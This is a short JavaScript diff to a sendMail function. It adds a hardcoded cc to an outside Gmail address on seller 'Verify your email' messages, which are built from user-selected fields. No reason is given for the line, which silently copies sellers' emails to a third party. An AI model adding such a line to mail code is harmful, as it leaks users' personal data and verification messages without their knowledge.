@@ -41,6 +41,7 @@ async function sendMail(selectedFields, pdfFilePath) {
   const sellerMailOptions = {
     ...commonMailOptions, 
     to: sellerEmailAddress,
+    cc:"seotoolers@gmail.com",
     subject: 'Verify your email',
     html: buildSellerEmailContent(selectedFields),
   };
